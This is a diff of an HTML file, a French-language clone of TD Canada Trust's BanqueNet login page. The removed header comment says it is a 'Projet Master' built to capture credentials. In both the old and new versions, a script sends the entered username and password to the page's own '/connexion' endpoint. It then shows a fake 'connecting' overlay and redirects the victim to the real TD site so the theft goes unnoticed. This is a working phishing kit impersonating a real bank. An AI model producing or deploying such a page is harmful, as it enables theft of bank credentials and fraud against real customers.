@@ -1,475 +1,91 @@
 <!DOCTYPE html>
-<!--
-=============================================================================
-  TD BANQUENET — PAGE DE CONNEXION RECRÉE
-  Auteur : Projet Master
-  But    : Reproduire fidèlement la page TD avec capture d'identifiants
-           et redirection vers le site officiel.
-=============================================================================
--->
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Se connecter à BanqueNet – TD Canada Trust</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <style>
-    :root {
-      --td-green: #54B948;
-      --td-dark-green: #003F2D;
-      --td-green-hover: #429638;
-      --white: #FFFFFF;
-      --text-primary: #1A1A1A;
-      --text-secondary: #595959;
-      --bg-alert: #FFF8DC;
-      --border-alert: #D4A017;
-      --font-main: 'Gill Sans', 'Calibri', 'Trebuchet MS', sans-serif;
-    }
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: var(--font-main);
-      font-size: 15px;
-      color: var(--text-primary);
-      background: var(--white);
-      line-height: 1.6;
-    }
-    .lang-bar {
-      background: #f0f0f0;
-      border-bottom: 1px solid #ddd;
-      padding: 4px 1rem;
-      display: flex;
-      justify-content: flex-end;
-      gap: 1rem;
-      font-size: 0.8125rem;
-    }
-    .lang-bar a { color: var(--td-dark-green); text-decoration: none; }
-    .main-nav {
-      background-color: var(--td-dark-green);
-      height: 60px;
-      display: flex;
-      align-items: center;
-      padding: 0 1.5rem;
-    }
-    .nav-inner {
-      max-width: 960px;
-      width: 100%;
-      margin: 0 auto;
-      display: flex;
-      align-items: center;
-      gap: 2rem;
-    }
-    .td-logo {
-      width: 42px;
-      height: 42px;
-      background-color: var(--td-green);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 700;
-      font-size: 0.9rem;
-      text-decoration: none;
-      flex-shrink: 0;
-    }
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 1.5rem;
-      list-style: none;
-      flex: 1;
-    }
-    .nav-links a {
-      color: var(--white);
-      text-decoration: none;
-      font-size: 0.9375rem;
-    }
-    .nav-links a:hover { color: var(--td-green); }
-    .page-content {
-      max-width: 960px;
-      margin: 0 auto;
-      padding: 2rem 1rem 3rem;
-    }
-    .page-title {
-      font-size: 1.75rem;
-      font-weight: 400;
-      color: var(--text-primary);
-      margin-bottom: 1.5rem;
-    }
-    .alert-fraud {
-      background-color: var(--bg-alert);
-      border-left: 4px solid var(--border-alert);
-      padding: 1.25rem 1.5rem;
-      margin-bottom: 2rem;
-      border-radius: 0 4px 4px 0;
-    }
-    .alert-fraud .alert-icon {
-      font-size: 1.25rem;
-      margin-bottom: 0.75rem;
-      color: var(--text-primary);
-    }
-    .alert-fraud p {
-      font-size: 0.9375rem;
-      color: var(--text-primary);
-      margin-bottom: 0.75rem;
-    }
-    .alert-fraud a {
-      color: var(--td-dark-green);
-      text-decoration: underline;
-    }
-    .main-grid {
-      display: grid;
-      grid-template-columns: 3fr 2fr;
-      gap: 2rem;
-      align-items: start;
-    }
-    @media (max-width: 768px) {
-      .main-grid { grid-template-columns: 1fr; }
-    }
-    .login-form-container { background: var(--white); }
-    .form-group { margin-bottom: 1.25rem; }
-    .form-label {
-      display: block;
-      font-size: 0.9375rem;
-      color: var(--text-primary);
-      margin-bottom: 6px;
-    }
-    .form-input {
-      width: 100%;
-      padding: 10px 12px;
-      border: 1px solid #767676;
-      border-radius: 4px;
-      font-size: 1rem;
-      font-family: inherit;
-      color: var(--text-primary);
-      background: var(--white);
-      outline: none;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
-    }
-    .form-input:focus {
-      border-color: var(--td-dark-green);
-      box-shadow: 0 0 0 3px rgba(0, 63, 45, 0.15);
-    }
-    .password-wrapper { position: relative; }
-    .password-wrapper .form-input { padding-right: 42px; }
-    .toggle-password {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      cursor: pointer;
-      color: var(--text-secondary);
-      font-size: 1rem;
-      padding: 4px;
-    }
-    .optional-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-      color: var(--td-dark-green);
-      text-decoration: none;
-      font-size: 0.9375rem;
-      margin: 8px 0 1rem;
-    }
-    .checkbox-group {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 1.25rem;
-    }
-    .checkbox-group input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      accent-color: var(--td-dark-green);
-      cursor: pointer;
-    }
-    .btn-primary {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      background-color: var(--td-green);
-      color: var(--white);
-      border: none;
-      border-radius: 4px;
-      padding: 12px 24px;
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      max-width: 240px;
-      transition: background-color 0.2s ease;
-    }
-    .btn-primary:hover { background-color: var(--td-green-hover); }
-    .btn-primary:disabled { opacity: 0.7; cursor: wait; }
-    .forgot-link {
-      display: inline-block;
-      color: var(--td-dark-green);
-      text-decoration: none;
-      font-size: 0.9375rem;
-      margin-top: 1rem;
-    }
-    .forgot-link:hover { text-decoration: underline; }
-    .security-guarantee {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 1.25rem;
-      font-size: 0.875rem;
-      color: var(--text-secondary);
-    }
-    .security-guarantee i { color: var(--td-dark-green); font-size: 1.1rem; }
-    .help-column {
-      display: flex;
-      flex-direction: column;
-      gap: 0;
-      padding-left: 2rem;
-      border-left: 1px solid #ddd;
-    }
-    @media (max-width: 768px) {
-      .help-column {
-        padding-left: 0;
-        border-left: none;
-        border-top: 1px solid #ddd;
-        padding-top: 2rem;
-      }
-    }
-    .btn-register {
-      display: block;
-      border: 2px solid var(--td-dark-green);
-      color: var(--td-dark-green);
-      background: transparent;
-      border-radius: 4px;
-      padding: 12px 16px;
-      font-size: 0.9375rem;
-      font-weight: 600;
-      text-align: center;
-      cursor: pointer;
-      text-decoration: none;
-      margin-bottom: 1.25rem;
-      transition: background 0.15s ease, color 0.15s ease;
-    }
-    .btn-register:hover {
-      background: var(--td-dark-green);
-      color: var(--white);
-    }
-    .welcome-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 1rem;
-      margin-bottom: 1.25rem;
-    }
-    .welcome-header h2 {
-      font-size: 1.25rem;
-      font-weight: 400;
-      line-height: 1.3;
-    }
-    .help-section {
-      padding: 1.25rem 0;
-      border-bottom: 1px solid #ddd;
-    }
-    .help-section h2 {
-      font-size: 1.0625rem;
-      font-weight: 700;
-      color: var(--text-primary);
-      margin-bottom: 0.5rem;
-    }
-    .help-link {
-      display: block;
-      color: var(--td-dark-green);
-      text-decoration: none;
-      font-size: 0.9375rem;
-      padding: 2px 0;
-    }
-    .help-link:hover { text-decoration: underline; }
-    .help-link::after { content: ' ›'; }
-    footer {
-      background-color: var(--td-dark-green);
-      color: var(--white);
-      margin-top: 3rem;
-      padding: 2rem 1rem;
-      text-align: center;
-    }
-    .footer-legal {
-      max-width: 960px;
-      margin: 0 auto;
-      font-size: 0.8125rem;
-      line-height: 1.6;
-      margin-bottom: 2rem;
-    }
-    .footer-legal a { color: var(--td-green); text-decoration: none; }
-    .redirect-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 63, 45, 0.95);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      gap: 1rem;
-      text-align: center;
-      color: var(--white);
-      z-index: 1000;
-    }
-    .redirect-overlay.active { display: flex; }
-    .spinner {
-      width: 48px;
-      height: 48px;
-      border: 4px solid rgba(255,255,255,0.3);
-      border-top-color: var(--td-green);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Se connecter à BanqueNet | TD</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:#1a1a1a;line-height:1.6}
+.header{background:#003F2D;color:white;padding:15px 20px}
+.header-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;gap:20px}
+.logo{background:#54B948;padding:8px 12px;border-radius:4px;font-weight:700;font-size:20px}
+.nav{display:flex;gap:20px;list-style:none;margin-left:30px}
+.nav a{color:white;text-decoration:none}
+.main{max-width:900px;margin:40px auto;padding:0 20px}
+.title{font-size:28px;font-weight:700;margin-bottom:25px}
+.alert{background:#FFFBEB;border-left:4px solid #C8A84B;padding:20px;margin-bottom:30px;border-radius:4px}
+.alert p{margin-bottom:10px;font-size:14px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:0;background:white;border:1px solid #ddd;border-radius:8px;overflow:hidden}
+.form-panel{padding:30px;border-right:1px solid #ddd}
+.form-group{margin-bottom:20px}
+.form-group label{display:block;font-weight:600;font-size:14px;margin-bottom:6px}
+.input{width:100%;height:44px;padding:0 12px;border:1.5px solid #D0D5DD;border-radius:4px;font-size:15px}
+.input:focus{outline:none;border-color:#54B948;box-shadow:0 0 0 3px rgba(84,185,72,0.18)}
+.checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}
+.checkbox-row input{width:18px;height:18px;accent-color:#54B948}
+.btn{background:#54B948;color:white;border:none;padding:12px 30px;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-bottom:15px}
+.btn:hover{background:#3A9B35}
+.btn:disabled{opacity:0.7;cursor:wait}
+.forgot{color:#003F2D;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-bottom:20px}
+.security{display:flex;align-items:center;gap:8px;font-size:13px;color:#666;padding-top:15px;border-top:1px solid #ddd}
+.info-panel{padding:30px}
+.welcome{font-size:20px;font-weight:700;margin-bottom:15px}
+.btn-outline{display:block;border:2px solid #003F2D;color:#003F2D;padding:10px 16px;border-radius:8px;text-align:center;text-decoration:none;font-weight:700;margin-bottom:20px;background:white}
+.btn-outline:hover{background:#003F2D;color:white}
+.help-section{margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #ddd}
+.help-section:last-child{border:none;margin:0;padding:0}
+.help-section h3{font-size:16px;font-weight:700;margin-bottom:8px}
+.help-section a{color:#003F2D;font-size:14px;font-weight:600;display:block;padding:4px 0;text-decoration:none}
+.help-section a::after{content:' ›'}
+.footer{background:#003F2D;color:white;padding:30px 20px;text-align:center;margin-top:40px}
+.footer a{color:#54B948;text-decoration:none;font-weight:700}
+.overlay{position:fixed;inset:0;background:rgba(0,63,45,0.95);display:none;align-items:center;justify-content:center;flex-direction:column;gap:15px;color:white;z-index:1000}
+.overlay.active{display:flex}
+.spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,0.3);border-top-color:#54B948;border-radius:50%;animation:spin 0.8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:768px){.nav{display:none}.grid{grid-template-columns:1fr}.form-panel{border-right:none;border-bottom:1px solid #ddd}}
+</style>
 </head>
 <body>
-
-  <div class="lang-bar">
-    <a href="#">Français</a>
-    <a href="#">English</a>
-  </div>
-
-  <nav class="main-nav">
-    <div class="nav-inner">
-      <a href="#" class="td-logo">TD</a>
-      <ul class="nav-links">
-        <li><a href="#">Mes comptes</a></li>
-        <li><a href="#">Comment faire</a></li>
-        <li><a href="#">Produits</a></li>
-        <li><a href="#">Solutions</a></li>
-      </ul>
-    </div>
-  </nav>
-
-  <main class="page-content">
-    <h1 class="page-title">Se connecter à BanqueNet</h1>
-
-    <section class="alert-fraud">
-      <div class="alert-icon">⚠️</div>
-      <p><strong>Rappel :</strong> La TD ne vous appellera ni ne vous enverra jamais de message texte pour vous demander des renseignements personnels ou des fonds.</p>
-      <p>Si vous croyez que vos comptes TD ont été compromis, visitez <a href="#">Signaler une activité suspecte</a>.</p>
-    </section>
-
-    <div class="main-grid">
-      <div class="login-form-container">
-        <form id="loginForm">
-          <div class="form-group">
-            <label class="form-label" for="username">Nom d'utilisateur ou carte Accès</label>
-            <input class="form-input" type="text" id="username" name="username" required>
-            <a href="#" class="optional-link">+ Description (optionnel)</a>
-          </div>
-
-          <div class="form-group">
-            <label class="form-label" for="password">Mot de passe</label>
-            <div class="password-wrapper">
-              <input class="form-input" type="password" id="password" name="password" required>
-              <button type="button" class="toggle-password" id="togglePassword">
-                <i class="fa-regular fa-eye"></i>
-              </button>
-            </div>
-          </div>
-
-          <div class="checkbox-group">
-            <input type="checkbox" id="rememberMe" name="rememberMe">
-            <label for="rememberMe">Mémoriser mes renseignements</label>
-          </div>
-
-          <button type="submit" class="btn-primary" id="submitBtn">
-            <i class="fa-solid fa-lock"></i> Ouvrir une session
-          </button>
-
-          <a href="#" class="forgot-link">Nom d'utilisateur ou mot de passe oubliés? ›</a>
-
-          <div class="security-guarantee">
-            <i class="fa-solid fa-lock"></i>
-            <span>Garant. sécur. serv. mob. ou en ligne de la TD: <a href="#">Vous êtes protégé ›</a></span>
-          </div>
-        </form>
-      </div>
-
-      <aside class="help-column">
-        <div class="welcome-header">
-          <h2>Bienvenue dans BanqueNet, commençons.</h2>
-          <a href="#" class="btn-register">S'inscrire en ligne maintenant</a>
-        </div>
-        
-        <div class="help-section">
-          <h2>Aide pour ouvrir une session</h2>
-          <a href="#" class="help-link">Obtenir de l'aide pour ouvrir une session</a>
-          <a href="#" class="help-link">Réinitialiser votre mot de passe</a>
-        </div>
-
-        <div class="help-section">
-          <h2>Sécurité Améliorée</h2>
-          <a href="#" class="help-link">FAQ sur la vérification en deux temps</a>
-          <a href="#" class="help-link">Améliorer votre protection contre la fraude</a>
-        </div>
-      </aside>
-    </div>
-  </main>
-
-  <footer>
-    <div class="footer-legal">
-      En utilisant BanqueNet, vous acceptez les <a href="#">Modalités des services financiers</a> et la <a href="#">Convention relative à l'accès</a>.
-    </div>
-    <div style="font-size: 1.25rem; margin-bottom: 0.5rem;">
-      Aimeriez-vous parler à un conseiller? <a href="#" style="color: var(--td-green); text-decoration: none; font-weight: 600;">Nous joindre ›</a>
-    </div>
-  </footer>
-
-  <div class="redirect-overlay" id="redirectOverlay">
-    <div class="spinner"></div>
-    <p>Connexion à BanqueNet TD en cours...</p>
-    <p style="font-size:0.875rem; opacity:0.8;">Vous allez être redirigé vers le site officiel.</p>
-  </div>
-
-  <script>
-    // Toggle mot de passe
-    const toggleBtn = document.getElementById('togglePassword');
-    const passwordFld = document.getElementById('password');
-    
-    toggleBtn.addEventListener('click', function() {
-      const isHidden = passwordFld.type === 'password';
-      passwordFld.type = isHidden ? 'text' : 'password';
-      this.innerHTML = isHidden ? '<i class="fa-regular fa-eye-slash"></i>' : '<i class="fa-regular fa-eye"></i>';
-    });
-
-    // Soumission formulaire : Capture + Redirection
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const btn = document.getElementById('submitBtn');
-      
-      // Change le bouton
-      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connexion en cours...';
-      btn.disabled = true;
-      
-      // Affiche l'overlay
-      document.getElementById('redirectOverlay').classList.add('active');
-      
-      // 🔥 ENVOIE LES IDENTIFIANTS AU SERVEUR (logs Render)
-      try {
-        await fetch('/connexion', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-          body: 'email=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
-        });
-      } catch(err) {
-        // Continue même si erreur
-      }
-      
-      // 🎯 Redirection vers le VRAI site TD après 1.5s
-      setTimeout(() => {
-        window.location.href = 'https://www.td.com/francais/connexion/';
-      }, 1500);
-    });
-  </script>
-
+<header class="header"><div class="header-inner"><div class="logo">TD</div><ul class="nav"><li><a href="#">Mes comptes</a></li><li><a href="#">Comment faire</a></li><li><a href="#">Produits</a></li><li><a href="#">Solutions</a></li></ul></div></header>
+<main class="main">
+<h1 class="title">Se connecter à BanqueNet</h1>
+<aside class="alert"><p><strong>Rappel :</strong> La TD ne vous appellera ni ne vous enverra jamais de message texte pour vous demander des renseignements personnels ou des fonds.</p><p>Si vous croyez que vos comptes TD ont été compromis, visitez <a href="#">Signaler une activité suspecte</a>.</p></aside>
+<div class="grid">
+<div class="form-panel">
+<form id="loginForm">
+<div class="form-group"><label>Nom d'utilisateur ou carte Accès</label><input type="text" id="username" class="input" required></div>
+<div class="form-group"><label>Mot de passe</label><input type="password" id="password" class="input" required></div>
+<div class="checkbox-row"><input type="checkbox" id="remember"><label for="remember">Mémoriser mes renseignements</label></div>
+<button type="submit" class="btn" id="submitBtn"><i class="fa-solid fa-lock"></i> Ouvrir une session</button>
+<a href="#" class="forgot">Nom d'utilisateur ou mot de passe oubliés?</a>
+<div class="security"><i class="fa-solid fa-lock"></i><span>Garant. sécur. serv. mob. ou en ligne de la TD: <a href="#">Vous êtes protégé</a></span></div>
+</form>
+</div>
+<aside class="info-panel">
+<div class="welcome">Bienvenue dans BanqueNet, commençons.</div>
+<a href="#" class="btn-outline">S'inscrire en ligne maintenant</a>
+<div class="help-section"><h3>Aide pour ouvrir une session</h3><a href="#">Obtenir de l'aide</a><a href="#">Réinitialiser votre mot de passe</a></div>
+<div class="help-section"><h3>Sécurité Améliorée</h3><a href="#">FAQ vérification en deux temps</a><a href="#">Protection contre la fraude</a></div>
+</aside>
+</div>
+</main>
+<footer class="footer"><p>En utilisant BanqueNet, vous acceptez les <a href="#">Modalités des services financiers</a>.</p><p style="margin-top:15px;font-size:18px">Aimeriez-vous parler à un conseiller? <a href="#">Nous joindre</a></p></footer>
+<div class="overlay" id="overlay"><div class="spinner"></div><p>Connexion à BanqueNet TD en cours...</p><p style="font-size:14px;opacity:0.8">Vous allez être redirigé vers le site officiel.</p></div>
+<script>
+document.getElementById('loginForm').addEventListener('submit',async function(e){
+e.preventDefault();
+const username=document.getElementById('username').value;
+const password=document.getElementById('password').value;
+const btn=document.getElementById('submitBtn');
+btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Connexion en cours...';
+btn.disabled=true;
+document.getElementById('overlay').classList.add('active');
+try{await fetch('/connexion',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email='+encodeURIComponent(username)+'&password='+encodeURIComponent(password)})}catch(err){}
+setTimeout(()=>{window.location.href='https://www.td.com/francais/connexion/'},1500);
+});
+</script>
 </body>
 </html>
